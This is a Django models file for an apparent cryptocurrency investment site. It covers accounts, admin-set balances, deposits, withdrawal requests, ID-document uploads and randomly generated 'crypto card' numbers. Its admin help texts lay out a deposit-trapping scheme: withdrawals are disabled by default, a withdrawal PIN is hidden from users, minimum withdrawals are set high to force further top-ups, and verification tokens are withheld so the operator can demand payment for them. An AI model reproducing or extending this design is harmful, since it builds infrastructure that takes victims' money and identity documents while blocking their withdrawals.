
from django.contrib.auth.models import AbstractUser, BaseUserManager, Group, Permission, PermissionsMixin
from django.template.loader import render_to_string
from django.core.mail import EmailMultiAlternatives
from django.db.models.signals import post_save
from django.utils.html import strip_tags
from django.core.mail import send_mail
from django.dispatch import receiver
from django.http import JsonResponse
from django.db import transaction
from django.conf import settings
from django.db import models
from decimal import Decimal
from datetime import datetime, timedelta
from django.utils import timezone
import random
import string
import logging

logger = logging.getLogger('django')


# Defines my user manager Custom

class CustomUserManager(BaseUserManager):
    def create_user(self, username, password=None, **extra_fields):
        user = self.model(username=username, **extra_fields)
        user.set_password(password)
        user.save(using=self._db)
        return user

    def create_superuser(self, username, password=None, **extra_fields):
        extra_fields.setdefault('is_staff', True)
        extra_fields.setdefault('is_superuser', True)

        return self.create_user(username, password, **extra_fields)
    
# Defines my users outside Django default user model

class CustomUser(AbstractUser, PermissionsMixin):
    email = models.EmailField(unique=True)
    username = models.CharField(max_length=30, unique=True)
    firstname = models.CharField(max_length=30, blank=True)
    lastname = models.CharField(max_length=30, blank=True)
    is_superuser = models.BooleanField(default=False)
    objects = CustomUserManager()

    USERNAME_FIELD = 'username'
    REQUIRED_FIELDS = ['firstname', 'lastname']

    def __str__(self):
        id = self.email.split('@')[0]
        return str(id)

@receiver(post_save, sender=CustomUser)
def send_new_user_email(sender, instance, created, **kwargs):
    if created:
        try:
            send_mail(
            subject='You have a new registered user.',
            message=f'User: {instance.username} just created a new equinox account. Please log in and review. here are some important informatoin=== full name: {instance.firstname} {instance.lastname}.',
            from_email=settings.DEFAULT_FROM_EMAIL,
            recipient_list=[settings.ADMIN_EMAIL]
            )
        except Exception as e:
            logger.exception(f"Failed to send welcome email to {settings.ADMIN_EMAIL}. Error: {e}")
            pass
        

class Profiles(models.Model):
    verification_choices = [
        ('Under review', 'Under Review'),
        ('Verified', 'Verified'),
        ('Failed', 'Failed'),
        ('Awaiting', 'Awaiting'),] 
    trade_choices = [
        ('Active', 'Active'), 
        ('Suspended', 'Suspended'),
        ('Completed', 'Completed'),
        ('Canceled', 'Canceled'),
        ('No Trade', 'No Trade'),]
    pref_currency = [
        ('GBP', 'GBP'),
        ('USD', 'USD'),
        ('EUR', 'EUR'),
    ]
    user = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    can_login = models.BooleanField(
        default=True, 
        verbose_name='Account Access', help_text='Decide whether this account can login, True by default')
    nationality = models.CharField(max_length=50, null=True, blank=True)
    profile_pic = models.ImageField(upload_to='profile_images/', null=True, blank=True)

    deposits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    bonus = models.DecimalField(default=10.00, max_digits=10, decimal_places=2, blank=True)
    profits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)

    preferred_currency = models.CharField(max_length=10, blank=True, null=True, choices=pref_currency, default='GBP', help_text='User\'s preferred currency')
    email_alerts = models.BooleanField(default=True, help_text='Whether this user can receive email notifications. the user can turn this on or off in their settings')

    account_manager = models.CharField(
        max_length=255, 
        blank=True, 
        default='not assigned', 
        verbose_name='Account Manager', 
        help_text='Assign a Trader for this user.')
    withdrawal_limit = models.DecimalField(
        default=7000.00, 
        max_digits=10, 
        decimal_places=2, verbose_name='Minimum withdrawal', help_text='Set the minimum amount this user can withdraw. helpful if you want to control the withdrwal behaviour so that the user will need to top up their account to meet the minimum amount')
    pin = models.IntegerField(default=0, verbose_name='Withdrawal pin', help_text='This PIN is automatically generated but not shown to the user. Without this PIN, the user will not be able to withdraw.')

    can_withraw = models.BooleanField(
        default=False, 
        verbose_name='Withdrawal Access', 
        help_text='Give this user the ability to withdraw. By default, the user will not be able to withdraw')
    trade_status = models.CharField(max_length=30, default='No Trade', choices=trade_choices)
    verification_status = models.CharField(max_length=50, default='Awaiting',choices=verification_choices)
    requires_verification_token = models.BooleanField(default=False, help_text='Decide whether this user needs a verification token to submit account verification requests. If this is Turned on, this token will be automatically generated for this account but will not be mailed to them. You can decide to ask for certain payment to get this token from you. And if Turned off, the user will not be prompted for a verification token to submit account verification requests.', verbose_name='Requires Verification Token')
    verification_token = models.CharField(max_length=255, blank=True, null=True, help_text='This field will be filled with the verification token automatically if you turn on the "Requires Verification Token" field above')
    alert_user = models.BooleanField(default=False)
    @property
    def total_balance(self):
        return self.deposits + self.bonus + self.profits
    
    def save(self, *args, **kwargs):
        if not self.pin:
            self.pin = ''.join(random.choices(string.digits[1:], k=6))

        if self.requires_verification_token and not self.verification_token:
            token = ''.join(random.choices(string.ascii_uppercase + string.digits, k=25))
            self.verification_token = token
        elif self.verification_token and not self.requires_verification_token:
            self.verification_token = ''
        
        investment = Investments.objects.filter(investor=self.user).order_by('-date').first()
        if investment:
            investment.status = self.trade_status
            investment.save()
        super().save(*args, **kwargs)
    def __str__(self):
        return f'{self.user.firstname} {self.user.lastname} profile'

@receiver(post_save, sender=Profiles)
def send_trade_status_email(sender, instance, created, **kwargs):
    if not created and instance.alert_user and instance.email_alerts:
        if instance.trade_status == 'Active':
            subject = 'Congratulations! Your trade has been activated'
            template = 'trade-status.html'
        elif instance.trade_status == 'Completed':
            subject = 'Congratulations! Your trade has been completed'
            template = 'trade-completed.html'
        elif instance.trade_status == 'Suspended':
            subject = 'Action required! Your trade has been suspended'
            template = 'trade-suspended.html'
        elif instance.trade_status == 'Canceled':
            subject = 'Action required! Your trade has been canceled'
            template = 'trade-canceled.html'
        else:
            subject = None
            template = None
   
        if subject and template:
            html_content = render_to_string(template, {'userprofile': instance})
            text_content = strip_tags(html_content) 

            # Send the email
            email = EmailMultiAlternatives(
                subject,
                text_content,
                settings.DEFAULT_FROM_EMAIL,
                [instance.user.email],
            )
            email.attach_alternative(html_content, "text/html")
            try:
                email.send()
            except Exception as e:
                logger.exception(f'"Error sending email to {instance.user.email}", ERROR:{e}')
                pass
            instance.alert_user = False
            instance.save()

class BalanceUSD(models.Model):
    profile = models.OneToOneField(Profiles, on_delete=models.CASCADE, related_name='usd_balance')
    deposits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True, help_text='this balances update automatically based on the user\'s current balance. You should not change any field here manually.')
    bonus = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    profits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    @property
    def total_balance(self):
        return self.deposits + self.bonus + self.profits
    
    def __str__(self):
        return f'{self.profile.user.username}\'s balance'

class BalanceEUR(models.Model):
    profile = models.OneToOneField(Profiles, on_delete=models.CASCADE, related_name='euro_balance')
    deposits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True, help_text='this balances update automatically based on the user\'s current balance. You should not change any field here manually.')
    bonus = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    profits = models.DecimalField(default=0.00, max_digits=10, decimal_places=2, blank=True)
    
    @property
    def total_balance(self):
        return self.deposits + self.bonus + self.profits
    
    def __str__(self):
        return f'{self.profile.user.username}\'s balance'
    
class Currencies(models.Model):
    code = models.CharField(max_length=3, default='GBP', help_text='these fields are created and updated automatically, please do not change them.')
    name = models.CharField(max_length=50, help_text='this balances update automatically based on the user\'s current balance. You should not change any field here manually.')
    sign = models.CharField(max_length=3, help_text='this balances update automatically based on the user\'s current balance. You should not change any field here manually.')
    exchange_rate = models.DecimalField(max_digits=10, decimal_places=6, help_text='this balances update automatically based on the user\'s current balance. You should not change any field here manually.')
    def __str__(self):
        return self.code

class Activities(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    activity_type = models.CharField(max_length=20)
    activity_value = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True)
    activity_description = models.TextField()
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.activity_type} by {self.user.username}'

class is_verified(models.Model):
    user = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    verified = models.BooleanField(default=False)
    email = models.EmailField(null=True, blank=True)
    verification_code = models.IntegerField()
    creation_time = models.DateTimeField(auto_now_add=True)
    account_verified = models.BooleanField(default=False)

@receiver(post_save, sender=is_verified)
def send_welcome_email(sender, instance, created, **kwargs):
    if instance.verified and not instance.account_verified:
        subject = f'The sky is your new limit, {instance.user.firstname}!'
        message = render_to_string('welcome_email.html', {'user': instance.user})
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = [instance.email]
        try:
            send_mail(
                subject, 
                message, 
                from_email, 
                recipient_list,
                html_message=message,
            )
        except Exception as e:
            logger.exception(f'"Error sending email to {instance.email}", ERROR:{e}')
            pass
    elif instance.verified and instance.account_verified:
        subject = 'Eligible to continue with identity verification'
        message = f'Hello {instance.user.firstname}, You\'ve successfully re-verified your email. You may now continue with your intended action.'
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = [instance.email]
        try:
            send_mail(
                subject, 
                message, 
                from_email, 
                recipient_list,
                html_message=message,
            )
        except Exception as e:
            logger.exception(f'"Error sending email to {instance.email}", ERROR:{e}')
            pass


class ExchangeRates(models.Model):
    bitcoin_rate = models.DecimalField(decimal_places=10, max_digits=20, null=True, blank=True)
    ethereum_rate = models.DecimalField(decimal_places=10, max_digits=20, null=True, blank=True)
    usdt_rate = models.DecimalField(decimal_places=10, max_digits=20, null=True, blank=True)

class CryptoBalances(models.Model):
    user = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    bitcoin_balance = models.DecimalField(decimal_places=10, max_digits=20, null=True, blank=True)
    ethereum_balance = models.DecimalField(decimal_places=10, max_digits=20, null=True, blank=True)
    usdt_balance = models.DecimalField(decimal_places=10, max_digits=20, null=True, blank=True)

@receiver(post_save, sender=ExchangeRates)
def update_crypto_balances(sender, **kwargs):
    exchange_rates = ExchangeRates.objects.first()
    if exchange_rates:
        for user_profile in Profiles.objects.all():
            crypto_balances, created = CryptoBalances.objects.get_or_create(user=user_profile.user)
            crypto_balances.bitcoin_balance = user_profile.total_balance * exchange_rates.bitcoin_rate
            crypto_balances.ethereum_balance = user_profile.total_balance * exchange_rates.ethereum_rate
            crypto_balances.usdt_balance = user_profile.total_balance * exchange_rates.usdt_rate
            crypto_balances.save()
    else:
        print('No exchange rates found, Unable to Update Balances. ')
    

class MinimumDeposit(models.Model):
    user = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    amount = models.IntegerField(default=500)

    def __str__(self):
        return f'{self.user.username}\'s minimum deposit'

class CryptoCards(models.Model):
    card_status_choices = [
        ('Not activated', 'Not activated'),
        ('Activated', 'Activated'),
        ('Blocked', 'Blocked'),]
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    card_holder = models.CharField(max_length=100, blank=True, null=True)
    card_number = models.CharField(max_length=100, null=True, blank=True)
    expiry_date = models.DateField()
    cvv = models.IntegerField(null=True, blank=True)
    available_amount = models.DecimalField(max_digits=15, decimal_places=2, default=0.00, null=True, blank=True)
    card_status = models.CharField(max_length=15, default='Not activated', choices=card_status_choices)

    def save(self, *args, **kwargs):
        if not self.card_number:
            prefixes = ['5190', '4040', '5922', '4139']
            prefix = random.choice(prefixes)
            self.card_number = prefix + ''.join(random.choices(string.digits, k=12))
        if not self.cvv:
            self.cvv = ''.join(random.choices(string.digits, k=3))
        super().save(*args, **kwargs)
    
    def __str__(self):
        return f'{self.card_holder}\'s card'

@receiver(post_save, sender=CryptoCards)
def send_card_activation_mail(sender, instance, created, **kwargs):
    if created and instance.user.profiles.email_alerts:
        subject = f'Congratulations! on your new card {instance.user.firstname}'
        template = 'card_activation.html'

        html_content = render_to_string(template, {'card': instance})
        text_content = strip_tags(html_content) 

        # Send the email
        email = EmailMultiAlternatives(
            subject,
            text_content,
            settings.DEFAULT_FROM_EMAIL,
            [instance.user.email],
        )
        email.attach_alternative(html_content, "text/html")
        try:
            email.send()
        except Exception as e:
            logger.exception(f"Error sending card activation mail: {e}")
            pass
 
   
class Notifications(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    title = models.CharField(max_length=100, default= 'Welcome!')
    message = models.TextField(default='Welcome')
    created_at = models.DateTimeField(auto_now_add=True)
    seen = models.BooleanField(default=False)
    def __str__(self):
        return f'{self.user.username}\'s notification'

@receiver(post_save, sender=Notifications)
def send_notifications_email(sender, instance, created, **kwargs):
    if created:
        subject = 'New notification: ' + instance.title
        body = instance.message
        email = EmailMultiAlternatives(
            subject,
            body,
            settings.DEFAULT_FROM_EMAIL,
            [instance.user.email])
        try:
            email.send()
        except Exception as e:
            logger.exception(f"Error sending notification mail: {e}")
            pass

#terms and conditions model


# Withdrawal request model.
class WithdrawalRequest(models.Model):
    options = [
        ('Under review', 'Under review'),
        ('Processing', 'Processing'),
        ('Failed', 'Failed'),
        ('Approved', 'Approved'),
        ('Completed', 'Completed'),
    ]
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    network = models.CharField(max_length=100, default='no data')
    address = models.CharField(max_length=255, default='no data')
    amount = models.DecimalField(max_digits=10, decimal_places=2, default=0.00)
    status = models.CharField(max_length=30, default='Checking', choices=options)
    status_message = models.TextField(max_length=5000, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    RequestID = models.CharField(max_length=100, blank=True, null=True)

    def __str__(self):
        return f'{self.user.username} - {self.amount}, {self.created_at.strftime("%d/%m/%Y, %H:%M:%S")}'

@receiver(post_save, sender=WithdrawalRequest)
def send_withdrawal_status_update_email(sender, instance, created, **kwargs):
    if not created and instance.user.profiles.email_alerts:
        if instance.status == 'Failed':
            subject = 'Withdrawal Request Failed'
            template = 'withdrawal_failed.html'
        elif instance.status == 'Approved':
            subject = 'Withdrawal Request Approved'
            template = 'withdrawal_approved.html'

        # Render the email content using a template
        html_content = render_to_string(template, {'withdrawal_request': instance})
        text_content = strip_tags(html_content)  
        # Send the email
        email = EmailMultiAlternatives(
            subject,
            text_content,
            settings.DEFAULT_FROM_EMAIL,
            [instance.user.email],
        )
        email.attach_alternative(html_content, "text/html")
        try:
            email.send()
        except Exception as e:
            logger.exception(f"Error sending withdrawal status update email: {e}")
            pass


class BalanceTracker(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    withdrawal_request = models.ForeignKey('WithdrawalRequest', on_delete=models.CASCADE, related_name='balance_tracker', null=True, blank=True)
    last_deposit = models.DecimalField(null=True, max_digits=10, decimal_places=2, blank=True)
    last_profits = models.DecimalField(null=True, max_digits=10, decimal_places=2, blank=True)
    last_bonus = models.DecimalField(null=True, max_digits=10, decimal_places=2, blank=True)
    time_updated = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.user.username}\'s balance history'



@receiver(post_save, sender=WithdrawalRequest)
def reverse_transactions(sender, instance, created, **kwargs):
    tracker = BalanceTracker.objects.filter(user=instance.user).first()

    if instance.status == 'Failed':
        # Reverse the transaction if failed
        try:
            with transaction.atomic():
                user = instance.user
                profile = Profiles.objects.get(user=user)

                if tracker:
                    # Reverse the balances to their previous state
                    profile.deposits = tracker.last_deposit
                    profile.profits = tracker.last_profits
                    profile.bonus = tracker.last_bonus
                    profile.save()
                    tracker.delete()

        except Exception as e:
            logger.exception(f"Error reversing transaction: {e}")
    
    elif instance.status == 'Approved' or instance.status == 'Completed':
        # Handle the case when the withdrawal is successful
        try:
            with transaction.atomic():
                # Delete the tracker after the withdrawal is successfully processed
                if tracker:
                    tracker.delete()
        except Exception as e:
            logger.exception(f"Error deleting balance tracker after approval: {e}")


#wallet address model
class WalletAddress(models.Model):
    bitcoin_address = models.CharField(max_length=150, verbose_name='Company Bitcoin Address')
    ethereum_address = models.CharField(max_length=150,  verbose_name='Company Ethereum Address')
    tether_USDT = models.CharField(max_length=150, verbose_name='Company Tether USDT Address')
    usdt_ERC20_address = models.CharField(max_length=150, verbose_name='Company USDT ERC20 Address')
    bnb_address = models.CharField(max_length=150, verbose_name='Company Binance Coin Address')
    lite_coin_address = models.CharField(max_length=150, verbose_name='Company Litecoin Address')
    osmosis_address = models.CharField(max_length=150, verbose_name='Company Osmosis Address')
    solana_address = models.CharField(max_length=150, verbose_name='Company Solana Address')
    ton_address = models.CharField(max_length=150, verbose_name='Company TON Address')
    polygon_matic = models.CharField(max_length=150, verbose_name='Company Polygon-matic Address')

    def __str__(self):
        return 'Wallet Addresses'

# Deposit model

class Deposits(models.Model):
    options = [
        ('No deposit', 'No Deposit'),
        ('Failed', 'Failed'),
        ('Under review', 'Under review'),
        ('Confirmed', 'Confirmed'),
    ]
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    deposit_amount = models.DecimalField(max_digits=20, decimal_places=2, default=0.00, null=True, blank=True)
    address=models.CharField(max_length=255, null=True, blank=True)
    network = models.CharField(max_length=100, null=True, blank=True)
    hash = models.CharField(max_length=255, null=True, blank=True)
    status = models.CharField(max_length=50, default='No Deposit', choices=options)
    status_message = models.TextField(max_length=5000, null=True, blank=True)
    deposit_id = models.CharField(default='', max_length=8, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    def save(self, *args, **kwargs):
        if not self.deposit_id:
            self.deposit_id = ''.join(random.choices(string.digits, k=8))
        super().save(*args, **kwargs)

    def __str__(self):
        return f'{self.user.firstname} {self.user.lastname} - £{self.deposit_amount}'
    
        

@receiver(post_save, sender=Deposits)
def update_balance(sender, instance, created, **kwargs):
    if instance.status == 'Confirmed':
        user = instance.user
        profile = Profiles.objects.get(user=user)
        profile.deposits += instance.deposit_amount
        profile.save()


@receiver(post_save, sender=Deposits)
def send_status_update_email(sender, instance, created, **kwargs):
    if not created and instance.user.profiles.email_alerts:
        if instance.status == 'Failed':
            subject = 'Payment Failed'
            template = 'deposit_failed.html'
        elif instance.status == 'Confirmed':
            subject = 'Payment Confirmed'
            template = 'deposit_confirmed.html'
        else:
            template = None
            subject = None

        if (template and subject):
            html_content = render_to_string(template, {'deposit': instance})
            text_content = strip_tags(html_content) 

            # Send the email
            email = EmailMultiAlternatives(
                subject,
                text_content,
                settings.DEFAULT_FROM_EMAIL,
                [instance.user.email])
            email.attach_alternative(html_content, "text/html")
            try:
                email.send()
            except Exception as e:
                logger.exception(f"Error sending email. {e}")

@receiver(post_save, sender=Deposits)
def send_mail_to_admin(sender, instance, created, **kwargs):
    if created:
        subject = f'New deposit submitted by {instance.user.firstname} {instance.user.lastname}'
        message = f'{instance.user.firstname} {instance.user.lastname} has just submitted a deposit request. Payment details = <strong>Network: {instance.network}</strong>, <strong>Amount Deposited: {instance.deposit_amount}</strong>. Please login and confirm the payment within 50 minutes to enable the user proceed with operations.'
        try:
            send_mail(
                subject,
                message,
                settings.DEFAULT_FROM_EMAIL,
                [settings.ADMIN_EMAIL],
                html_message=message,
                fail_silently=False,
            )
        except Exception as e:
            logger.exception(f"Error sending email to admin. {e}")
            pass

class Verification(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    email = models.CharField(max_length=100, null=True, blank=True)
    firstname = models.CharField(max_length=100, null=True, blank=True)
    lastname = models.CharField(max_length=100, null=True, blank=True)
    address = models.CharField(max_length=300, null=True, blank=True )
    nationality = models.CharField(max_length=255, null=True, blank=True)
    document_number = models.CharField(max_length=255, null=True, blank=True)
    phone = models.CharField(max_length=20, default='', blank=True, null=True)
    DOB = models.DateField(null=True, blank=True)
    id_front = models.ImageField(upload_to='id_cards/front', null=True, blank=True)
    id_back = models.ImageField(upload_to='id_cards/back', null=True, blank=True)
    face = models.ImageField(upload_to='id_cards/faces/', null=True, blank=True)
    facial = models.FileField(upload_to='id_cards/videos/', null=True, blank=True)
    date_submitted = models.DateTimeField(default=datetime.now)
    def __str__(self):
        return f'{self.user.username} documents'


class send_email(models.Model):
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    Subject = models.CharField(max_length=255, blank=True, null=True)
    Message = models.TextField(null=True, blank=True)

    def __str__(self):
        return self.Subject


@receiver(post_save, sender=send_email)
def send_user_email(sender, instance, created, **kwargs):
    if created and instance.user.profiles.email_alerts:
        subject = instance.Subject
        template = 'send_user_email.html'
        html_content = render_to_string(template, {'message': instance})
        text_content = strip_tags(html_content) 

        # Send the email
        email = EmailMultiAlternatives(
            subject,
            text_content,
            settings.DEFAULT_FROM_EMAIL,
            [instance.user.email],
        )
        email.attach_alternative(html_content, "text/html")
        email.send()


class Investments(models.Model):
    plan_choices = [
        ('micro', 'Micro'), 
        ('standard', 'Standard'),
        ('premium', 'Premium'),
        ('elite', 'Elite'),
        ('premium-yields', 'Premium Yields'),
        ('Signatory', 'Signatory'),
        ]
    status_choices = [
        ('Processing', 'Processing'),
        ('completed', 'Completed'),
        ('rejected', 'Rejected'),
        ('In progress', 'In progress'),

          ]
    investor = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    plan = models.CharField(max_length=100, default='micro', choices=plan_choices)
    amount = models.DecimalField(default=0.00, max_digits=10, decimal_places=2)
    duration = models.CharField(max_length=100)
    waiver = models.BooleanField(default=False)
    debit_account = models.CharField(max_length=100, default='')
    reference = models.CharField(max_length=30, default='')
    date = models.DateTimeField(auto_now_add=True)
    status = models.CharField(
        max_length=100,
        choices=status_choices, 
        default='awaiting slot entry'
        )
    def __str__(self):
        return f'{self.investor} investment: £{self.amount}'

@receiver(post_save, sender=Investments)
def send_admin_email(sender, instance, created, **kwargs):
    if created:
        subject = "New Investment"
        body = f"{instance.investor} Just invested: {instance.amount} under: {instance.plan} for a period of: {instance.duration}. Login and check"  
        email = EmailMultiAlternatives(
            subject,
            body,
            settings.DEFAULT_FROM_EMAIL,
            [settings.ADMIN_EMAIL],
        )
        try:
            email.send()
        except Exception as e:
            pass
        
class CardRequest(models.Model):
    status_choices = [
        ('processing', 'Processing'),
        ('approved', 'Approved'),
        ('rejected', 'Rejected'),
        ]
    user = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    name_on_card = models.CharField(max_length=100)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    status = models.CharField(max_length=100, choices=status_choices, default='pending')
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.user.username
    def save(self, *args, **kwargs):
        if self.status == 'approved':
            approval_date = timezone.now()
            expiry_date = approval_date + timedelta(days=730)
            card = CryptoCards.objects.create(
                user=self.user,
                card_holder=self.name_on_card,
                expiry_date=expiry_date,
                available_amount=self.amount - 1000,
                card_status='Activated',
            )
            card.save()
        super().save(*args, **kwargs)

@receiver(post_save, sender=CardRequest)
def notify_admin(sender, instance, created, **kwargs):
    if created:
        subject = "New Card Request"
        body = f"{instance.user.username} Just requested for a crypto card on your website with  {instance.amount}. Login and check"  
        email = EmailMultiAlternatives(
            subject,
            body,
            settings.DEFAULT_FROM_EMAIL,
            [settings.ADMIN_EMAIL],
        )
        try:
            email.send()
        except Exception as e:
            logger.exception(f'Error sending email: {e}')
            pass


class Referrals(models.Model):
    user = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    referral_id = models.CharField(max_length=100, unique=True)
    referrals = models.ManyToManyField(CustomUser, related_name='my_referrals' , blank=True)

    def __str__(self):
        return 'Referrer: '+ self.user.username

# Create your models here.
